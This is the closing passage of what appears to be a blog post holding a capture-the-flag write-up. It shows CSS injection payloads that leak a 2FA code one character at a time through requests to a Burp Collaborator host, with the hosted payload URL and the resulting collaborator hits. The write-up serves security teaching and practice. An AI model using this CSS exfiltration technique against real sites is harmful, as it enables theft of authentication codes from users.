<a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a><span class="nt">input</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">6</span><span class="o">)[</span><span class="nt">value</span><span class="o">^=</span><span class="s2">&quot;0&quot;</span><span class="o">]</span><span class="w"> </span><span class="p">{</span><span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;http://6-0.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net&quot;</span><span class="p">);}</span>
<a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a><span class="c">/* ... */</span>
<a id="__codelineno-74-6" name="__codelineno-74-6" href="#__codelineno-74-6"></a><span class="nt">input</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">6</span><span class="o">)[</span><span class="nt">value</span><span class="o">^=</span><span class="s2">&quot;9&quot;</span><span class="o">]</span><span class="w"> </span><span class="p">{</span><span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;http://6-9.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net&quot;</span><span class="p">);}</span>
<a id="__codelineno-74-7" name="__codelineno-74-7" href="#__codelineno-74-7"></a><span class="nt">input</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">6</span><span class="o">)[</span><span class="nt">value</span><span class="o">^=</span><span class="s2">&quot;A&quot;</span><span class="o">]</span><span class="w"> </span><span class="p">{</span><span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;http://6-mA.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net&quot;</span><span class="p">);}</span>
<a id="__codelineno-74-8" name="__codelineno-74-8" href="#__codelineno-74-8"></a><span class="c">/* ... */</span>
<a id="__codelineno-74-9" name="__codelineno-74-9" href="#__codelineno-74-9"></a><span class="nt">input</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">6</span><span class="o">)[</span><span class="nt">value</span><span class="o">^=</span><span class="s2">&quot;Z&quot;</span><span class="o">]</span><span class="w"> </span><span class="p">{</span><span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;http://6-mZ.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net&quot;</span><span class="p">);}</span>
</code></pre></div>
<p>To host the final payload I used <a href="https://gist.github.com/">GitHub Gist</a> and <a href="https://raw.githack.com/">raw.githack.com</a> to set the proper <code>Content-Type</code> headers:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>app_style=&lt;@urlencode_5&gt;https://gist.githack.com/Techbrunch/82c3691e20a6c754a4f16e93d752cc3e/raw/837efa256058fc642443b7c59e81c7827d4a1ff4/h12006.css&lt;@/urlencode_5&gt;
</code></pre></div>
<p>This is how it looks like in Burp after we submit our payload (here I'm using <a href="https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f">Taborator</a>):</p>
<p><img alt="" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-04%20at%2009.21.23.png" /></p>
<p>Based on the requests made to the collaborator we can easily extract the 2FA code.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>1-mt.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
<a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a>2-mv.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
<a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a>3-u.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
<a id="__codelineno-76-4" name="__codelineno-76-4" href="#__codelineno-76-4"></a>4-7.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
<a id="__codelineno-76-5" name="__codelineno-76-5" href="#__codelineno-76-5"></a>5-my.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
<a id="__codelineno-76-6" name="__codelineno-76-6" href="#__codelineno-76-6"></a>6-1.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
<a id="__codelineno-76-7" name="__codelineno-76-7" href="#__codelineno-76-7"></a>7-mw.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net
</code></pre></div>
<p>For this request, the 2FA code is <code>TVu7Y1W</code> , once submitted we get the final FLAG !</p>
<p><img alt="" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-06%20at%2000.03.06.png" /></p>
<p>I hope you enjoyed reading this writeup, if so you can follow me on Twitter at <a href="https://twitter.com/TechBrunchFR">@TechbrunchFR</a>.</p>







  
    
  
  
    
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">September 25, 2024</span>
  </span>

    
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Created">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">September 25, 2024</span>
  </span>

    
    
      
  
  <span class="md-source-file__fact">
    <span class="md-icon" title="Contributors">
      
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 4a4 4 0 0 1 4 4 4 4 0 0 1-4 4 4 4 0 0 1-4-4 4 4 0 0 1 4-4m0 10c4.42 0 8 1.79 8 4v2H4v-2c0-2.21 3.58-4 8-4"/></svg>
      
    </span>
    <nav>
      
        <a href="mailto:techbrunch@users.noreply.github.com">Techbrunch</a>
    </nav>
  </span>

    
    
  </aside>



  



      
    </article>
  </div>

          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://twitter.com/techbrunchfr" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://github.com/Techbrunch" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.annotate", "header.autohide", "announce.dismiss"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.d6f25eb3.min.js"></script>
      
    
  </body>
</html>